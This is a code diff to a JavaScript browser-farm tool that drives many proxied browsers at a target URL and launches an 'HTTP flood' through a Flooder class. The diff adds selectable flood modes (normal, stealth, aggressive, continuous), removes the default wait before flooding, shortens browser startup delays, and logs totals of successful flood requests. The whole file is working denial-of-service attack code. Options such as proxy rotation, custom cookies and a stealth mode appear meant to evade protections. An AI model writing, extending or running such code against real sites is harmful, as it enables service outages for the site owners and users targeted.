@@ -35,6 +35,11 @@ const BROWSER_CONFIG = {
       .find((arg) => arg.startsWith("--filter-proxies="))
       ?.split("=")[1] === "true" ||
     false,
+  browserMode:
+    process.argv
+      .find((arg) => arg.startsWith("--browser-mode="))
+      ?.split("=")[1] ||
+    process.argv.find((arg) => arg.startsWith("-bmode="))?.split("=")[1],
   targetPort:
     parseInt(
       process.argv.find((arg) => arg.startsWith("-port="))?.split("=")[1]
@@ -99,7 +104,7 @@ const BROWSER_CONFIG = {
   waitTime:
     process.argv.find((arg) => arg.startsWith("--waitTime="))?.split("=")[1] ||
     process.argv.find((arg) => arg.startsWith("-wt="))?.split("=")[1] ||
-    "5:15",
+    "0:0",
   customCookie:
     process.argv
       .find((arg) => arg.startsWith("--cookie-value="))
@@ -154,6 +159,11 @@ for (let i = 0; i < args.length; i++) {
     case "--headless":
     case "-hl":
       BROWSER_CONFIG.headless = args[i + 1] === "true";
+      i++;
+      break;
+    case "--browser-mode":
+    case "-bmode":
+      BROWSER_CONFIG.browserMode = args[i + 1];
       i++;
       break;
     case "--filter-proxies":
@@ -234,6 +244,7 @@ Required Options:
 Optional Options:
   -b, --browsers <num>     Number of browsers (default: 5)
   -hl, --headless <true|false>  Run browsers in headless mode (default: false)
+  -bmode, --browser-mode <normal|stealth|aggressive|continuous> Determine, which type of flood the Flooder instance will use
   -fp, --filter-proxies <true|false>  Filter non working proxies (default: false)
   -port, --targetPort <port>  Target port if not standard, only relevant for Flooder (default: 80/443)
   -pt, --proxy-timeout <ms>  Proxy connection timeout in milliseconds (default: 8000) Notice: Only set this, if --filter-proxies or -fp is set to true!
@@ -591,7 +602,7 @@ async function startBrowsers(targetUrl, browserCount = 10) {
     const browserPromise = setupBrowser(targetUrl, i, browsers, proxies);
     browserPromises.push(browserPromise);
     if (i < browserCount) {
-      await new Promise((r) => setTimeout(r, 3000));
+      await new Promise((r) => setTimeout(r, 500));
     }
   }
 
@@ -620,13 +631,18 @@ async function startBrowsers(targetUrl, browserCount = 10) {
       "FARM",
       "All browsers are now in waiting state. Starting HTTP flood..."
     );
-    let waitTime = randnum(
-      parseInt(BROWSER_CONFIG.waitTime.split(":")[0]),
-      parseInt(BROWSER_CONFIG.waitTime.split(":")[1])
-    );
-    for (let i = waitTime; i > 0; i--) {
-      log("INFO", `Waiting: ${i}s`);
-      await new Promise((resolve) => setTimeout(resolve, 1000));
+    let waitTime = BROWSER_CONFIG.waitTime.split(":")[1];
+    if (waitTime > 0) {
+      waitTime = randnum(
+        parseInt(BROWSER_CONFIG.waitTime.split(":")[0]),
+        parseInt(BROWSER_CONFIG.waitTime.split(":")[1])
+      );
+      for (let i = waitTime; i > 0; i--) {
+        log("INFO", `Waiting: ${i}s`);
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+      }
+    } else {
+      log("INFO", "No waitTime specified. Proceeding with HTTP Flooder...");
     }
     /**
      * ? Start flooding here using the Flooder.js implementation
@@ -637,19 +653,84 @@ async function startBrowsers(targetUrl, browserCount = 10) {
     /*console.dir(results, { depth: null });
      */
     const flooderPromises = [];
-    for (const { browserData } of successfulBrowsers) {
-      //console.dir(browserData, { depth: null });
-      /**
-       * ? For every promise in the results array, give one browserData object to the flooder.
-       */
-      for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
-        const httpRequest = new Flooder(browserData);
-        const instance = httpRequest.start(browserData.page, i);
-        flooderPromises.push(instance);
+    switch (BROWSER_CONFIG.browserMode) {
+      case "stealth":
+        {
+          for (const { browserData } of successfulBrowsers) {
+            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
+              const httpRequest = new Flooder(browserData);
+              const instance = httpRequest.startStealth(browserData.page);
+              flooderPromises.push(instance);
+            }
+          }
+        }
+        break;
+      case "aggressive":
+        {
+          for (const { browserData } of successfulBrowsers) {
+            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
+              const httpRequest = new Flooder(browserData);
+              const instance = httpRequest.startAggressive(browserData.page);
+              flooderPromises.push(instance);
+            }
+          }
+        }
+        break;
+      case "normal":
+        {
+          for (const { browserData } of successfulBrowsers) {
+            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
+              const httpRequest = new Flooder(browserData);
+              const instance = httpRequest.start(browserData.page, i);
+              flooderPromises.push(instance);
+            }
+          }
+        }
+        break;
+      case "continuous":
+        {
+          for (const { browserData } of successfulBrowsers) {
+            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
+              const httpRequest = new Flooder(browserData);
+              const instance = httpRequest.startContinuous(
+                browserData.page,
+                (BROWSER_CONFIG.runtime * 1000) / 2 + 30
+              );
+              flooderPromises.push(instance);
+            }
+          }
+        }
+        break;
+      default: {
+        for (const { browserData } of successfulBrowsers) {
+          for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
+            const httpRequest = new Flooder(browserData);
+            const instance = httpRequest.start(browserData.page, i);
+            flooderPromises.push(instance);
+          }
+        }
       }
     }
+
     const settledFlooders = await Promise.allSettled(flooderPromises);
-    /*await new Promise(() => {});*/
+
+    const flooderResults = settledFlooders
+      .map((p) => (p.status === "fulfilled" ? p.value : null))
+      .filter(Boolean);
+
+    const totalSuccess = flooderResults.reduce(
+      (sum, r) => sum + (r.stats?.success || 0),
+      0
+    );
+    const totalRequests = flooderResults.reduce(
+      (sum, r) => sum + (r.stats?.total || 0),
+      0
+    );
+
+    log(
+      "SUCCESS",
+      `All flooders completed: ${totalSuccess}/${totalRequests} total successful requests`
+    );
   } else {
     log("ERROR", "No browsers successful, cannot start flooding");
     for (let i = 0; i < browsers.length; i++) {
